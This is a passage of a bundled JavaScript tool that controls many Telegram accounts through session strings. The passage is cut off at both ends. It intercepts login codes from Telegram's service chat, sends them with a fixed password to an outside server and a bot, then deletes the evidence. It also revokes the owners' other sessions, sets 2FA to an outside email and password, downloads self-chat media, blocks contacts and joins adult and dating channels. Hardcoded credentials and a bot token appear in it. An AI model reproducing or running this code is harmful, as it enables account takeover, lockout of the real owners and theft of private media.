      const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
      const result = await db.getActiveChannels(150, 0, keys, channels.ids, "channels");
      console.log("DbChannelsLen: ", result.length);
      let resp = '';
      for (const channel of result) {

        resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
      }
      client.joinChannels(resp);
    }
  }
}

function pushToconnectionQueue(userName, processId) {
  const existingIndex = connetionQueue.findIndex(entry => entry.userName === userName);
  if (existingIndex !== -1) {
    connetionQueue[existingIndex].processId = processId;
  } else {
    connetionQueue.push({ userName, processId });
  }
}

__webpack_async_result__();
} catch(e) { __webpack_async_result__(e); } }, 1);

/***/ }),

/***/ "./mailreader.js":
/*!***********************!*\
  !*** ./mailreader.js ***!
  \***********************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   connectToMail: () => (/* binding */ connectToMail),
/* harmony export */   disconnectfromMail: () => (/* binding */ disconnectfromMail),
/* harmony export */   getcode: () => (/* binding */ getcode),
/* harmony export */   isMailReady: () => (/* binding */ isMailReady)
/* harmony export */ });
/* harmony import */ var imap__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! imap */ "imap");
/* harmony import */ var imap__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(imap__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./utils */ "./utils.js");


console.log("Started Mail Reader")
let isReady = false;

function isMailReady() {
    return isReady;
}

const imap = new (imap__WEBPACK_IMPORTED_MODULE_0___default())({
    user: process.env.GMAIL_ADD,
    password: process.env.GMAIL_PASS,
    host: 'imap.gmail.com',
    port: 993,
    tls: true,
    tlsOptions: {
        rejectUnauthorized: false
    }

});

async function openInbox(cb) {
    imap.openBox('INBOX', false, cb);
}

imap.once('ready', function () {
    console.log("ready")
    isReady = true;
    return true
});

imap.once('error', (err) => {
    console.error("SomeError :", err);
});

imap.once('end', () => {
    console.log('Connection ended');
});
let result = ''
async function getcode() {
    await openInbox(() => {
        const searchCriteria = [['FROM', 'noreply@telegram.org']];
        const fetchOptions = {
            bodies: ['HEADER', 'TEXT'],
            markSeen: true,
        };
        imap.search(searchCriteria, (err, results) => {
            if (err) throw err;
            console.log(results)
            if (results.length > 0) {
                const fetch = imap.fetch([results[results.length - 1]], fetchOptions);
                fetch.on('message', (msg, seqno) => {
                    const emailData = [];

                    msg.on('body', (stream, info) => {
                        let buffer = '';

                        stream.on('data', (chunk) => {
                            buffer += chunk.toString('utf8');
                        });

                        stream.on('end', () => {
                            if (info.which === 'TEXT') {
                                emailData.push(buffer);
                            }
                            imap.seq.addFlags([seqno], '\\Deleted', (err) => {
                                if (err) throw err;
                                imap.expunge((err) => {
                                    if (err) throw err;
                                    console.log(`Deleted message`);
                                });
                            });
                        });
                    });

                    msg.once('end', () => {
                        console.log(`Email #${seqno}, Latest${results[results.length - 1]}`);
                        console.log("EmailDataLength: ", emailData.length);
                        console.log("Mail:", emailData[emailData.length - 1].split('.'));
                        result = (0,_utils__WEBPACK_IMPORTED_MODULE_1__.fetchNumbersFromString)(emailData[emailData.length - 1].split('.')[0])
                    });
                });
                fetch.once('end', () => {
                    console.log("fetched mails")
                });
            }
        });
    });
    console.log("Returning from mail Reader:", result);
    if (result.length > 4) {
        imap.end();
    }
    return result
}

function connectToMail() {
    result = '';
    imap.connect();
}
function disconnectfromMail() {
    result = '';
    imap.end();
}


/***/ }),

/***/ "./telegramManager.js":
/*!****************************!*\
  !*** ./telegramManager.js ***!
  \****************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   createClient: () => (/* binding */ createClient),
/* harmony export */   deleteClient: () => (/* binding */ deleteClient),
/* harmony export */   disconnectAll: () => (/* binding */ disconnectAll),
/* harmony export */   getActiveClientSetup: () => (/* binding */ getActiveClientSetup),
/* harmony export */   getClient: () => (/* binding */ getClient),
/* harmony export */   hasClient: () => (/* binding */ hasClient),
/* harmony export */   setActiveClientSetup: () => (/* binding */ setActiveClientSetup)
/* harmony export */ });
/* harmony import */ var telegram__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! telegram */ "telegram");
/* harmony import */ var telegram__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(telegram__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var telegram_events_index_js__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! telegram/events/index.js */ "telegram/events/index.js");
/* harmony import */ var telegram_events_index_js__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(telegram_events_index_js__WEBPACK_IMPORTED_MODULE_1__);
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! axios */ "axios");
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(axios__WEBPACK_IMPORTED_MODULE_2__);
/* harmony import */ var telegram_sessions__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
/* harmony import */ var telegram_sessions__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(telegram_sessions__WEBPACK_IMPORTED_MODULE_3__);
/* harmony import */ var _mailreader__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./mailreader */ "./mailreader.js");
/* harmony import */ var telegram_client_uploads__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! telegram/client/uploads */ "telegram/client/uploads");
/* harmony import */ var telegram_client_uploads__WEBPACK_IMPORTED_MODULE_5___default = /*#__PURE__*/__webpack_require__.n(telegram_client_uploads__WEBPACK_IMPORTED_MODULE_5__);
/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./utils */ "./utils.js");
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! fs */ "fs");
/* harmony import */ var fs__WEBPACK_IMPORTED_MODULE_7___default = /*#__PURE__*/__webpack_require__.n(fs__WEBPACK_IMPORTED_MODULE_7__);
/* harmony import */ var _dbservice__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ./dbservice */ "./dbservice.js");










const clients = new Map();

let activeClientSetup = undefined
function getActiveClientSetup() {
    return activeClientSetup;
}

function setActiveClientSetup(data) {
    activeClientSetup = data
}

function getClient(number) {
    return clients.get(number);
}

function hasClient(number) {
    return clients.has(number);
}

async function deleteClient(number) {
    const cli = getClient(number);
    await cli?.disconnect();
    return clients.delete(number);
}

async function disconnectAll() {
    const data = clients.entries();
    console.log("Disconnecting All Clients");
    for (const [phoneNumber, client] of data) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        } catch (error) {
            console.log(error);
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}


async function createClient(number, session, autoDisconnect = true) {
    if (!clients.has(number)) {
        return new Promise(async (resolve) => {
            const cli = new TelegramManager(session, number);
            await cli.createClient(autoDisconnect);
            if (cli.expired) {
                clients.set(number, cli);
            }
            resolve(cli.expired);
        });
    } else {
        return { msgs: 10, total: 10 }
    }
}


class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new telegram_sessions__WEBPACK_IMPORTED_MODULE_3__.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.expired = false;
        this.channelArray = []
    }

    async disconnect() {
        await this.client.disconnect();
        await this.client.destroy();
        this.session.delete();
    }

    async createClient(autoDisconnect = true) {
        try {
            this.client = new telegram__WEBPACK_IMPORTED_MODULE_0__.TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                connectionRetries: 5,
            });
            console.log("Stating Client - ", this.phoneNumber);
            this.client.setLogLevel('error');
            await this.client.connect();
            // const msg = await this.client.sendMessage("777000", { message: "." });
            // await msg.delete({ revoke: true });
            const myMsgs = await this.client.getMessages('me', { limit: 8 });
            if (autoDisconnect) {
                setTimeout(async () => {
                    if (this.client.connected || clients.get(this.phoneNumber)) {
                        console.log("SELF destroy client");
                        await this.client.disconnect();
                        await this.client.destroy();
                        this.session.delete();
                    } else {
                        console.log("Client Already Disconnected");
                    }
                    clients.delete(this.phoneNumber);
                }, 180000)
            } else {
                const id = setInterval(async () => {
                    if (!this.client.connected || !clients.has(this.phoneNumber)) {
                        clearInterval(id);
                    }
                    await this.client.connect();
                }, 20000);
            }
            this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new telegram_events_index_js__WEBPACK_IMPORTED_MODULE_1__.NewMessage());
            console.log("Added event handler");
            const chats = await this.client?.getDialogs({ limit: 500 });
            console.log("TotalChats:", chats['total'])
            this.expired = { msgs: myMsgs['total'], total: chats['total'] }
        } catch (error) {
            console.log(error);
            this.expired = undefined;
        }
    }

    async getLastMsgs(limit) {
        const msgs = await this.client.getMessages("777000", { limit: parseInt(limit) });
        let resp = ''
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp = resp + msg.text + "\n"
        })
        return (resp)
    }
    async channelInfo(sendIds = false) {
        const chats = await this.client?.getDialogs({ limit: 600 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0
        this.channelArray.length = 0;
        console.log(chats["total"]);
        chats.map(async (chat) => {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = await chat.entity.toJSON();
                    const { broadcast, defaultBannedRights } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(chatEntity.username);
                    } else {
                        canSendFalseCount++;
                    }
                } catch (error) {
                    console.log(error)
                }
            }
        });
        const responseObj = {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : []
        };
        return responseObj
    }

    async joinChannels(str) {
        const db = _dbservice__WEBPACK_IMPORTED_MODULE_8__.ChannelService.getInstance();
        const channels = str.split('|');
        console.log(this.phoneNumber, " - channelsLen - ", channels.length)
        for (let i = 0; i < channels.length; i++) {
            if (!this.client.connected || !clients.has(this.phoneNumber)) {
                break;
            }
            const channel = channels[i].trim();
            console.log(this.phoneNumber, "Trying: ", channel)
            try {
                let joinResult = await this.client.invoke(
                    new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.channels.JoinChannel({
                        channel: await this.client.getEntity(channel)
                    })
                );
                console.log(this.phoneNumber, " - Joined channel Sucesss - ", channel)
                try {
                    const chatEntity = await this.client.getEntity(channel)
                    const { title, id, broadcast, defaultBannedRights, participantsCount, restricted, username } = chatEntity;
                    const entity = {
                        id: id.toString(),
                        title,
                        participantsCount,
                        username,
                        restricted,
                        broadcast,
                        sendMessages: defaultBannedRights?.sendMessages,
                        canSendMsgs: false,
                    };
                    if (!chatEntity.broadcast && !defaultBannedRights?.sendMessages) {
                        entity.canSendMsgs = true;
                        try {
                            await db.updateActiveChannel(entity.id.toString(), entity);
                            console.log("updated ActiveChannels");
                        } catch (error) {
                            console.log(error);
                            console.log("Failed to update ActiveChannels");
                        }
                    } else {
                        await db.removeOnefromActiveChannel({ channelId: entity.id.toString() });
                        await db.removeOnefromChannel({ channelId: entity.id.toString() });
                        console.log("Removed Cahnnel- ", channel)
                    }
                } catch (error) {
                    console.log(this.phoneNumber, " - Failed - ", error)
                }
            } catch (error) {
                console.log("Channels ERR: ", error);
                if (error.toString().includes("No user has") || error.toString().includes("USERNAME_INVALID")) {
                    await db.removeOnefromActiveChannel({ username: channel.replace("@", '') });
                    await db.removeOnefromChannel({ username: channel });
                    console.log("Removed Cahnnel- ", channel)
                }
                if (error.errorMessage === 'CHANNELS_TOO_MUCH' || error.errorMessage == "FLOOD") {
                    await deleteClient(this.phoneNumber);
                    break;
                }
            }
            console.log(this.phoneNumber, " - On waiting period")
            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
            console.log(this.phoneNumber, " - Will Try next")
        }
        console.log(this.phoneNumber, " - finished joining channels")
        await this.client.disconnect();
        await deleteClient(this.phoneNumber);
    }

    async deleteChat(chatId) {
        try {
            const result = await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.messages.DeleteChat({
                    chatId: chatId,
                })
            );
        } catch (error) {
            console.log(error)
        }
    }
    async removeOtherAuths() {
        const result = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.GetAuthorizations({}));
        const updatedAuthorizations = result.authorizations.map((auth) => {
            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
                || auth.deviceModel.toLowerCase().includes('windows')) {
                return auth;
            } else {
                this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.ResetAuthorization({ hash: auth.hash }));
                return null;
            }
        }).filter(Boolean);
        console.log(updatedAuthorizations);
    }

    async getAuths() {
        const result = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.GetAuthorizations({}));
        return result
    }

    async hasPassword() {
        const passwordInfo = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.GetPassword());
        return passwordInfo.hasPassword
    }

    async blockAllUsers() {
        const chats = await this.client?.getDialogs({ limit: 600 });
        for (let chat of chats) {
            if (chat.isUser) {
                await this.blockAUser(chat.id)
            }
            (0,_utils__WEBPACK_IMPORTED_MODULE_6__.sleep)(5000);
        }
    }

    async blockAUser(id) {
        const result = await this.client.invoke(
            new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.contacts.Block({
                id: id,
            })
        );
    }

    async getLastActiveTime() {
        const result = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.GetAuthorizations({}));
        let latest = 0
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore')) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        })
        return latest
    }

    async getMe() {
        const me = await this.client.getMe();
        return me
    }

    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.photos.GetUserPhotos({
                    userId: "me"
                })
            );
            console.log(result)
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(
                    new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.photos.DeletePhotos({
                        id: result.photos
                    }))
            }
            console.log("Deleted profile Photos");
        } catch (error) {
            console.log(error)
        }
    }

    async set2fa() {
        (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.connectToMail)()
        const intervalParentId = setInterval(async () => {
            const isReady = (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.isMailReady)();
            if (isReady) {
                clearInterval(intervalParentId);
                await this.client.updateTwoFaSettings({
                    isCheckPassword: false,
                    email: "storeslaksmi@gmail.com",
                    hint: "password - India143",
                    newPassword: "Ajtdmwajt1@",
                    emailCodeCallback: async (length) => {
                        console.log("code sent");
                        return new Promise(async (resolve) => {
                            let retry = 0
                            const intervalId = setInterval(async () => {
                                console.log("checking code");
                                retry++
                                const isReady = (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.isMailReady)();
                                if (isReady && retry < 4) {
                                    const code = await (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.getcode)();
                                    if (code !== '') {
                                        clearInterval(intervalId);
                                        (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.disconnectfromMail)()
                                        resolve(code);
                                    }
                                } else {
                                    clearInterval(intervalId);
                                    await this.client.disconnect();
                                    await deleteClient(this.phoneNumber);
                                    (0,_mailreader__WEBPACK_IMPORTED_MODULE_4__.disconnectfromMail)()
                                    resolve(code);
                                }
                            }, 6000);
                        });
                    },
                    onEmailCodeError: (e) => { console.log(e); return Promise.resolve("error") }
                })
            }
        }, 5000);
    }

    async getSelfChatMediaAndZip() {

        // const chat = await this.client.getEntity('me');
        const messageHistory = await this.client.getMessages('me', { limit: 2000 });

        const mediaMessages = messageHistory.filter((message) => {
            return message.photo || message.video;
        });

        if (mediaMessages.length === 0) {
            console.log("No media found in self chat messages.");
            return;
        }

        const path = "/tmp/download/self_chat_media";

        // const archive = await createArchive(zipFilename);

        for (const message of mediaMessages) {
            // console.log(message)
            try {
                const mediaBuffer = await this.client.downloadMedia(message);
                let fileExtension = '';
                if (isJPEG(mediaBuffer)) {
                    fileExtension = 'jpg';
                } else if (isPNG(mediaBuffer)) {
                    fileExtension = 'png';
                } else if (isGIF(mediaBuffer)) {
                    fileExtension = 'gif';
                } else if (isMP4(mediaBuffer)) {
                    fileExtension = 'mp4';
                } else if (isAVI(mediaBuffer)) {
                    fileExtension = 'avi';
                } else {
                    // Add more checks for other file types if needed
                }
                const filePath = path + "/" + message.id + "." + fileExtension;
                if (!fs__WEBPACK_IMPORTED_MODULE_7___default().existsSync(path)) {
                    fs__WEBPACK_IMPORTED_MODULE_7___default().mkdirSync(path, { recursive: true });
                }
                fs__WEBPACK_IMPORTED_MODULE_7___default().writeFile(filePath, mediaBuffer, (err) => {
                    if (err) {
                        console.error('Error writing file:', err);
                    } else {
                        console.log('File written successfully');
                    }
                });
            } catch (error) {
                console.error(`Error downloading media for message ${message.id}:`, error);
            }
        }

        // await archive.end();
        // Implement logic to send the ZIP file as API output (replace with your specific method)
        // Example using a hypothetical sendFile function:
        // await sendFile(zipFilename);
    }

    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyPhoneCall({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyProfilePhoto({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyPhoneNumber({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyStatusTimestamp({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );

            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyAbout({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
        }
        catch (e) {
            console.log(e)
        }
    }
    async updateProfile(firstName, about) {
        try {
            const result = await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.UpdateProfile({
                    firstName: firstName,
                    lastName: "",
                    about: about,
                })
            );
            console.log("Updated NAme: ", firstName);
        } catch (error) {
            console.log(error)
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = ''
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                const res = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            } catch (error) {
                console.log(error)
            }
        } else {
            while (true) {
                try {
                    const result = await this.client.invoke(
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.CheckUsername({ username })
                    );
                    console.log(result, " - ", username)
                    if (result) {
                        const res = await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username
                        break;
                    } else {
                        username = baseUsername + increment;
                        increment++;
                        await (0,_utils__WEBPACK_IMPORTED_MODULE_6__.sleep)(4000);
                    }
                } catch (error) {
                    console.log(error.message)
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                }
            }
        }
        return newUserName;
    }

    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new telegram_client_uploads__WEBPACK_IMPORTED_MODULE_5__.CustomFile(
                    'pic.jpg',
                    fs__WEBPACK_IMPORTED_MODULE_7___default().statSync(
                        image
                    ).size,
                    image
                ),
                workers: 1,
            });
            console.log("file uploaded- ", file)
            await this.client.invoke(new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated")
        } catch (error) {
            console.log(error)
        }
    }

    async updatePrivacy() {
        try {
            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyPhoneCall({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyProfilePhoto({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyPhoneNumber({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyStatusTimestamp({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
            await this.client.invoke(
                new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.account.SetPrivacy({
                    key: new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyKeyAbout({}),
                    rules: [
                        new telegram__WEBPACK_IMPORTED_MODULE_0__.Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
        }
        catch (e) {
            console.log(e)
        }
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            console.log("Message Recieved from - ", event.message.chatId.toString(), ": ", event.message.text)
            if (event.message.chatId.toString() == "777000") {
                console.log("Login Code received for - ", this.phoneNumber, '\nSetup - ', activeClientSetup);
                if (activeClientSetup && this.phoneNumber === activeClientSetup?.phoneNumber) {
                    console.log("LoginText: ", event.message.text)
                    const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
                    console.log("Code is:", code);
                    try {
                        const response = await axios__WEBPACK_IMPORTED_MODULE_2___default().get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                        console.log("Code Sent");
                    } catch (error) {
                        console.log(error)
                    }
                    await deleteClient(this.phoneNumber)
                }
                console.log(event.message.text.toLowerCase());
                const payload = {
                    "chat_id": "-1001801844217",
                    "text": event.message.text
                };
                axios__WEBPACK_IMPORTED_MODULE_2___default().post(ppplbot, payload)
                    .then((response) => {
                    })
                    .catch((error) => {
                        console.error('Error sending message:', error.response?.data?.description);
                    });
                await event.message.delete({ revoke: true });
            }
        }
    }
}


function isJPEG(buffer) {
    return buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF;
}

function isPNG(buffer) {
    return buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4E && buffer[3] === 0x47;
}

function isGIF(buffer) {
    return buffer[0] === 0x47 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x38 && (buffer[4] === 0x37 || buffer[4] === 0x39) && buffer[5] === 0x61;
}

function isMP4(buffer) {
    return buffer[0] === 0x00 && buffer[1] === 0x00 && buffer[2] === 0x00 && (buffer[3] === 0x18 || buffer[3] === 0x20) && buffer[4] === 0x66 && buffer[5] === 0x74 && buffer[6] === 0x79 && buffer[7] === 0x70;
}

function isAVI(buffer) {
    return buffer[0] === 0x52 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x46 && buffer[8] === 0x41 && buffer[9] === 0x56 && buffer[10] === 0x49 && buffer[11] === 0x20;
}

/***/ }),

/***/ "./utils.js":
/*!******************!*\
  !*** ./utils.js ***!
  \******************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   contains: () => (/* binding */ contains),
/* harmony export */   fetchNumbersFromString: () => (/* binding */ fetchNumbersFromString),
/* harmony export */   fetchWithTimeout: () => (/* binding */ fetchWithTimeout),
/* harmony export */   parseError: () => (/* binding */ parseError),
/* harmony export */   ppplbot: () => (/* binding */ ppplbot),
/* harmony export */   sleep: () => (/* binding */ sleep)
/* harmony export */ });
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! axios */ "axios");
/* harmony import */ var axios__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(axios__WEBPACK_IMPORTED_MODULE_0__);

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function contains(str, arr) {
  return (arr.some(element => {
      if (str?.includes(element)) {
          return true;
      }
      return false;
  }))
};
async function fetchWithTimeout(resource, options = {}, maxRetries = 3) {
  const timeout = options?.timeout || 15000;

  const source = axios__WEBPACK_IMPORTED_MODULE_0___default().CancelToken.source();
  const id = setTimeout(() => source.cancel(), timeout);
  for (let retryCount = 0; retryCount <= maxRetries; retryCount++) {
    try {
      const response = await axios__WEBPACK_IMPORTED_MODULE_0___default()({
        ...options,
        url: resource,
        cancelToken: source.token
      });
      clearTimeout(id);
      return response;
    } catch (error) {
      if (axios__WEBPACK_IMPORTED_MODULE_0___default().isCancel(error)) {
        console.log('Request canceled:', error.message, resource);
      } else {
        console.log("URL: ", resource)
        parseError(error)
      }
      if (retryCount < maxRetries) {
        await new Promise(resolve => setTimeout(resolve, 2000)); // 1 second delay
      } else {
        console.error(`All ${maxRetries + 1} retries failed for ${resource}`);
        return undefined;
      }
    }
  }
}

function fetchNumbersFromString(inputString) {
  const regex = /\d+/g;
  const matches = inputString.match(regex);
  if (matches) {
    const result = matches.join('');
    return result;
  } else {
    return '';
  }
}

function parseError(
  err,
  prefix = 'TgCms',
) {
  let status = 'UNKNOWN';
  let message = 'An unknown error occurred';
  let error = 'UnknownError';

  const extractMessage = (data) => {
    if (Array.isArray(data)) {
      const messages = data.map((item) => extractMessage(item));
      return messages.filter((message) => message !== undefined).join(', ');
    } else if (typeof data === 'string') {
      return data;
    } else if (typeof data === 'object' && data !== null) {
      let resultString = ''
      for (const key in data) {
        const value = data[key]
        if (Array.isArray(data[key]) && data[key].every(item => typeof item === 'string')) {
          resultString = resultString + data[key].join(', ');
        } else {
          const result = extractMessage(value);
          if (result) {
            resultString = resultString + result;
          }
        }
      }
      return resultString
    }
    return JSON.stringify(data);
  };

  if (err.response) {
    const response = err.response;
    status =
      response.data?.status ||
      response.status ||
      err.status ||
      'UNKNOWN';
    message =
      response.data?.message ||
      response.data?.errors ||
      response.message ||
      response.statusText ||
      response.data ||
      err.message ||
      'An error occurred';
    error =
      response.data?.error ||
      response.error ||
      err.name ||
      err.code ||
      'Error';
  } else if (err.request) {
    status = err.status || 'NO_RESPONSE';
    message = err.data?.message ||
      err.data?.errors ||
      err.message ||
      err.statusText ||
      err.data ||
      err.message || 'The request was triggered but no response was received';
    error = err.name || err.code || 'NoResponseError';
  } else if (err.message) {
    status = err.status || 'UNKNOWN';
    message = err.message;
    error = err.name || err.code || 'Error';
  }

  const msg = `${prefix ? `${prefix} ::` : ""} ${extractMessage(message)} `

  const resp = { status, message: msg, error };
  console.log(resp);
  return resp
}

let botCount = 0
const ppplbot = () => {
  let token;
  if (botCount % 2 == 1) {
    token = `bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY`
